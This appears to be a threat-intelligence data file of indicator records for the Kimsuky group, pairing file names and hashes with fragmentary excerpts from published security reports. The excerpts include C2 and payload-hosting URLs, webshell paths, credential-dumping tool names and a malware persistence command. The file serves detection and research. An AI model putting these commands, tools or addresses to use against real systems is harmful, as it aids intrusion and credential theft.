1.0.0,actor--kimsuky,artifact--sha256:4834b4843d8aa04e746d2906560e6b845d7d372384e53e0f1df3b63906651610,observation--sha256:a7d7e85771f45e29aaa7915e9b18f0443a65fb2dc2975f4bd8c8dbc39e464a5f,file-name,view_coma.php,view_coma.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4834b4843d8aa04e746d2906560e6b845d7d372384e53e0f1df3b63906651610,observation--sha256:d957f5878632dd82affd19b9a6ddb4bcb35ded023d314d4795f66c7432169816,file-name,view_coma.php,view_coma.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 64}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://kornorms.korean.go.kr/example/exampleList.do?regltn_code=0003 No ÿ May 2023, 183.111.100.193 (KR) In May 2023, AhnLab disclosed analysis information titled “Phishing attack targeting North Korean workers by Kimsuky Group” on the ASEC blog, and in this case, the target of hacking was *****. As a result of searching for a specific person working at a research institute, there was a history of appearing on broadcasts and giving interviews related to North Korea. Although this person is diff",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4834b4843d8aa04e746d2906560e6b845d7d372384e53e0f1df3b63906651610,observation--sha256:227e741df85719a23ff70cd1bf476e4b8ec56357acecffde406f5c44769a96f4,file-name,view_coma.php,view_coma.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 65}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"mailid.pnbbio.com/account/logi n.do mailid.gonggandesign.com/accont/login.do At www.scabm.co.kr, there are many files containing the PHP mailer used by the Kimsuky organization to send phishing emails and the system information of the hacked target connected to the phishing destination as ""mode_hacked target's mail ID.txt"" (42 The file was created around December 2022, and based on this, it was determined that the Kimsuky organization had been abusing www.scabm.co.kr as C2 since last year. (See ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4834b4843d8aa04e746d2906560e6b845d7d372384e53e0f1df3b63906651610,observation--sha256:985d08f19ee2b3408625840e601fda36541722457fa512e9990518a404b18bbf,file-name,view_coma.php,view_coma.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:87ed223e9dfb81f313593b0d03a45f522ae5b3baf2fa7f81ee817b1d716395e6,observation--sha256:a75e479ad0af34973db61bb8ba85b4ebe356e051dfe360a73468d275b10677b7,file-name,view_tail.php,view_tail.php,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:032947e39612db179513a5ea6375159c2d5623bfc942bedf0f66ee98d5565402,observation--sha256:5a24f623617edc88827c0d9255a08191489e31a5021b5e2a012bf6ca39f8ee55,file-name,viso.exe,viso.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:032947e39612db179513a5ea6375159c2d5623bfc942bedf0f66ee98d5565402,observation--sha256:4a7455f46599fd8bf5a4e6a2ebc97340a0e1282733da55d63d49cc64232695ed,file-name,viso.exe,viso.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 83}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report The malware shown in light yellow in the above (Table 47) is malware signed with a valid certificate (Subject Name: EGIS Co., Ltd.) from 6 years ago. The Kimsuky organization hacked domestic companies and signed malicious code with stolen certificates. A total of 59 malicious codes were signed with the same certificate around the same time, all of which were from the Kimsuky organization. This means that the stolen certificate was only used by the Kimsuky organiza",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2ddcc17e6e6623aacaf132e2aedd8ffdbc03e5a6b69269676b75302c5fa637de,observation--sha256:c312b2c25a194c3cbeb90650b31873c1fbc214166c7ad197bdc130be86b33632,file-name,vncpassview.exe,vncpassview.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:deb166cd0e4d47bd89e6bd4c9e52bdb7c4c9d24564d69be86082578c95f51c28,observation--sha256:08e574cc5a11958dbc43126c11416454d69b33aaa9caece161cfc0f4dec37726,file-name,vps20240103.docx,vps20240103.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 147}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,- Lots of passwords in `mnt/hgfs/Desktop/fish_25327/vps20240103.docx`.,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8d065f3ecf1cf1cfbeb6aceccd54db7cc699086a58b63e1c8bc2a51833027ad6,observation--sha256:f67bd9cc9dfdf1b389e26701b92c730b8b35f73f25d6071d4da26c89f8728eab,file-name,w64_poc.pdb,w64_poc.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:1915b1fb27237df27d3fa1972339e68197c6a860e45a2d546fd8e023b61e7c94,observation--sha256:f15b5bc8da31fcde764bae0a7caa5d1c3f357a82cbe17a8c729464babdda3e68,file-name,wf7weyr892hfwogewgsfg3.php,wf7weyr892hfwogewgsfg3.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ navernail.eu/ewf43fewfwf4tfw4/wf7weyr892hfwogewgsfg3.php 27.255.80.170(KR) 27.102.114.89(KR) 216.189.149.71(US) ÿ www.ssktool.co.kr/ssktool/20090401skin/chinese/quick/L_quick.php 59.7.91.171(KR) ÿ www.namastte.kr/sources/Util/AJAX.php 211.53.197.220(KR) 27.255.75.137(KR) We contacted the site administrator by email to analyze the cause of the upload, but we did not receive any feedback. Operation Covert Stalker Report 1.243.200.130(KR) 185.176.43.106(BG) 27.102.107.63(KR) 27.255.81.80(KR) 162.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1915b1fb27237df27d3fa1972339e68197c6a860e45a2d546fd8e023b61e7c94,observation--sha256:33304dbbb9343356d0c2c6e92e058de402a826fa0bff68e30f332657e7c195e0,file-name,wf7weyr892hfwogewgsfg3.php,wf7weyr892hfwogewgsfg3.php,candidate,2023-01-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 72}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Data MAL_BLOCK LOG_ID_WEB_ 20221031154004 I confirmed accessing the uploaded webshell URL. (See Table 39 below) msedge.exe 10:55:54 LOG_ID_WEB_ malware_path copycount.co.kr/pma/themes/original/skin.lib.php MAL_BLOCK diagnosis (Table 38) Webshell URL access blocking log of 22*.15*.24*.13*(KR) Operation Covert Stalker Report MAL_BLOCK 20221129154036 uemotion/user/data/cheditor4/1404/log&fopen=sqlite.zip IP filtering is applied to list.php used by some C2s built by the Kimsuky organization for the ,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:4bbbf54340f36f9faef8feb694861a1930d4021209679e5d6f2ada4fac52b586,observation--sha256:abee9934122e29896fd48cf2748d4154a69a47221f0bbdd48eb03bb2b12b5601,file-name,white_paper.doc,white_paper.doc,candidate,2019-02-14T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 20}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[그림 9-1] Document created by 'John Harvey' is modified by 'windowsmb' File Name OFT.docm Last Modified Date (KST) 2019-02-14 23:08 Last Modified Name JamFedura C2 http://192.186.142[.]74/cache/Fwvuj0.hta MD5 304d86463a1fff5183aacc17ef2b3730 File Name bot spec.docm Last Modified Date (KST) 2019-02-18 17:30 Last Modified Name JamFedura C2 http://192.186.142[.]74/mn/Xtgnb0.hta MD5 f816a9c4a3415e8bae807c09e0f80b38 File Name white_paper.doc Last Modified Date (KST) 2019-02-19 17:29 Last Modified Name,
1.0.0,actor--kimsuky,artifact--sha256:4bbbf54340f36f9faef8feb694861a1930d4021209679e5d6f2ada4fac52b586,observation--sha256:f343384f5bd10da2b3b33180e405b66b3eec54aa2a9f87018ddf36a7c0e7e024,file-name,white_paper.doc,white_paper.doc,candidate,2019-02-22T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 21}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,MD5 4118b251c977a682ebb4993601b9a7e3 File Name Schedule_.doc Last Modified Date (KST) 2019-02-22 17:09 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 29fbf69e72c0daac57d2cbba11bbfaa5 File Name xCryptoCrash_Schedule.doc Last Modified Date (KST) 2019-02-25 02:26 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 397ba1d0601558dfe34cd5aafaedd18e File Name white_paper.doc Last Modified Date (KST) 2019-02-26 15:40 Last Modified Name JamFedura C2 h,
1.0.0,actor--kimsuky,artifact--sha256:80cb04e4336493f114c0c69973db382f9d313210ce64be7b438a6b3d7cfff35d,observation--sha256:cc42faa2d120c4a08b59f5c49db61bb1878b1c9427b92fa090aa3f2c6697dabd,file-name,winlogon.exe,winlogon.exe,candidate,2023-07-29T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Below (Table 8) is an excerpt of only the logs related to BlackBit ransomware among the logs collected from the system hacked by the Kimsuky organization. It summarizes five reasons for determining that the organization intentionally executed BlackBit ransomware. (KR) initial diagnosis 2023-07-29 29 AhnLab's antivirus V3 has the “Use behavior-based diagnosis and Use ransomware security folder” option to respond to ransomware , and using this option can minimize damage caused by ransomware infect",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:80cb04e4336493f114c0c69973db382f9d313210ce64be7b438a6b3d7cfff35d,observation--sha256:37e0654537e56b0e57f88405ca9e5f0127e4b442b14f87cbec4d2a7d8da81d77,file-name,winlogon.exe,winlogon.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:acfc54dcb51c8941f3ed9a0d006ecfecf01d3b3469d4197b7786503823462819,observation--sha256:aa2aa37b559dca27403cbebef145461b11c11d1e0676d03468672073c0e4c968,file-name,wirelesskeyview.exe,wirelesskeyview.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:7985de65292164ed0cf04b595ca57372a2061d083c6c08fe3edebaf7961458b0,observation--sha256:7091da0f72edad143ae66714d98e85bb0d2415c2d9914dc52de13fb047b552d0,file-name,wirelesskeyview64.exe,wirelesskeyview64.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bf08fae52880c574d82e6cdaf27cd78ee16582b98fd16b32544f955b0f9d61ea,observation--sha256:19638aada75e9f2df5c9a9c508e458ea75e91ec7cbff83dfe7d837b5c0ad2fc1,file-name,wscript.exe,wscript.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 11}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3.2. sgic_info.html ○CHM파일을실행할경우, 내부에포함되어있는HTML파일이실행됩니다.이때, HTML파일의하단에존재하는악성스크립트가윈도우도움말실행프로그램인hh.exe 를통해CHM파일을“C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다. [그림3-4] HTML내부스크립트 [그림3-5] 디컴파일탐지 Genians SecurityCenter 10",
1.0.0,actor--kimsuky,artifact--sha256:bf08fae52880c574d82e6cdaf27cd78ee16582b98fd16b32544f955b0f9d61ea,observation--sha256:bf9bf9fe888d3390aa8372fcf746388875fc032508ea0a7db86ef3bac0665715,file-name,wscript.exe,wscript.exe,candidate,2021-11-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 71}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"(2) certuser.info In the table below (Table 36), hxxp://bipaf.org is the C2 through which the malicious document (MD5: 90a56bc6a66bb4e02265389529757460) communicates, and namastte has been hacked by the Kimsuky organization since November 2021, before April 2022, which was recognized by AhnLab. Abuse with C2 (Table 36) Malicious behavior log of 21*.16*.25*.5*(KR) A total of 45 malicious URLs with similar patterns were mapped to 21*.9*.1*.16*(KR) where certuser.info was mapped. 71 22*.15*.24*.13*",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:783e188d537d6ded50699d8dbba6533c03d92fa470bb09740db5311b389ec45d,observation--sha256:4f318a53e7dcef9b898b9ac75738acc3c1a843c7fe08aea0e64b669784ccc67a,file-name,x7s78gsx6.php,x7s78gsx6.php,candidate,2023-04-13T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 53}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"53 hxxps://listmember.info/tygygvftsfx8g6 8Gu8x7s78gsx6519.php HackTool/Win.RdpScan.R437610 Second, 27.255.***.***, where the webshell URL is mapped, is the IP assigned to this host and is an IP band frequently used by the Kimsuky organization when building C2. 27.255.80.170(KR) hxxps://a1ive.info/tygygvftsfx8g68Gu8 x7s78gsx6.php 2023-04-13 3 4 I used it. In the table below (Table 24), excluding webshell URLs 14 and 15, three patterns can be found in webshell URLs 1 to 13. C:\Users\DefaultUser\D",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b5f32bc71fb32a88814fc87bdda7062f68bd8a831d68c6343e1ecffda03a0e6d,observation--sha256:ae6946b0d5fb26774d843cf49f72ef91684217fd00e26340709dd19bea9eed5c,file-name,x86.exe,x86.exe,candidate,2023-07-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"C:\Windows\winlogon.exe 22*.10*.1*.6* It was determined that the Kimsuky organization intentionally stored it in Tools for malicious purposes. z\x32\mimilove.exe %SystemDrive%\users\%ASD%\downloads\tools\x86.exe C:\Users\Administrator\Desktop\tools\Tools\tools\svchost.exe \Start Menu\Programs\Startup\winlogon.exe Second, the word Tools is commonly found in the diagnostic file path of BlackBit ransomware, shown in light red. C:\Users\Administrator\AppData\Roaming\winlogon.exe Operation Covert Sta",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d21b092107849ea941dd6d898da5ad592332315029220d96db074cc2615a14bc,observation--sha256:7bd76259cef0d86ee23c40cdd2a9d9ca2f5e53f0f12bc57d9e320847ca68446c,file-name,xCryptoCrash_Schedule.doc,xCryptoCrash_Schedule.doc,candidate,2019-02-22T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 21}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,MD5 4118b251c977a682ebb4993601b9a7e3 File Name Schedule_.doc Last Modified Date (KST) 2019-02-22 17:09 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 29fbf69e72c0daac57d2cbba11bbfaa5 File Name xCryptoCrash_Schedule.doc Last Modified Date (KST) 2019-02-25 02:26 Last Modified Name JamFedura C2 http://192.186.142[.]74/post/Yluhi0.hta MD5 397ba1d0601558dfe34cd5aafaedd18e File Name white_paper.doc Last Modified Date (KST) 2019-02-26 15:40 Last Modified Name JamFedura C2 h,
1.0.0,actor--kimsuky,artifact--sha256:4d49a2ba7c5cfc237804cd8918e01be980fa2d05e00342e4a1d7c88bf39dc20d,observation--sha256:eda3ddf2a74b40cfd5249cb7f296246d5e686bd39b34b275b0a24075484608a1,file-name,xtgnb0.hta,xtgnb0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:7de39b6d523e7fdc778f9b27d13c9f6b46afd9b7a7e2db8aebf228c17b6f1b68,observation--sha256:61f8f1774d65de9048c5c7e3fe0922e60eb2ab1166cab079575ff6a29ca6358b,file-name,zip.dat,zip.dat,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[20]. 响应 C2 服务器远程指令 命令 动作 1 会提醒用户更新并进行更新操作 2 创建了 list.xls 和 zip.dat ，并遍历/sdcard 目录及其子文件夹下的 所有文件，把文件信息写入了 list.xls 3 上传指定的文件 4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果 写入 cmd_xxxxx.txt ,经过相同的伪装，调用 c.d() 上传 5 创建 sms.txt ，调用安卓短信协议，获取信息写入 sms.txt 6 清除 app 的数据 7 清除 app 的缓存 8 发送短信 3.5 攻击韩国原子能研究所 韩国新闻媒体《朝鲜日报》近日报道韩国原子能研究院于 5 月 14 日遭到朝鲜 APT 组 织 Kimsuky 攻击。韩国原子能研究院拥有核电站、核燃料等重要国防资料。根据披露信息 显示，攻击者利用原子能研究院 VPN 设备漏洞进入内网，使用了 13 个未经授权的外部 IP 访问 VPN 内部网络。",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c2d23e0b9cfca1f5ff1545c1fd825e70bb9e4321ad9e1a090d68254a7624da7c,observation--sha256:21d3b922550488458c8291c6f3c2798fe5c9a6727c5da7062ed10e486ec2d0b2,file-path,%APPDATA%\AF Download folder String AF Name of browser extension program,%APPDATA%\AF Download folder String AF Name of browser extension program,candidate,,unknown,unknown,not-stated,2023-03-20T00:00:00Z,source--browser-advisory-2023,kimsuky/kimsuky-2023-03-20-joint-cyber-security-advisory.pdf,"{""page"": 9}","[""activity--browser-google-play""]","[""malware--fastviewer""]","[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,9 Indicators of Compromise Chromium-based web browser extension program Type IoCs Note C2 servers gonamod[.]com HTTPS siekis[.]com HTTPS mode=cd2&ver=3.0 HTTP param Malicious files 012D5FFE697E33D81B9E7447F4AA338B manifest.json 582A033DA897C967FAADE386AC30F604 bg.js 51527624E7921A8157F820EB0CA78E29 dev .js %APPDATA%\AF Download folder String AF Name of browser extension program Abuse Google Play’s synchronization feature Type IoCs Note C2 servers navernnail[.]com HTTP lowerp.onlinewebshop[.]net ,
1.0.0,actor--kimsuky,artifact--sha256:a75eb325568c496a3ee99e62d5e7c6dad2de8888d148ab9e2fa545f23976c574,observation--sha256:fff05d1f858208b99df59285cb58492b5a382c3fd189a59096ff3cd1f5a2a594,file-path,%APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender,%APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
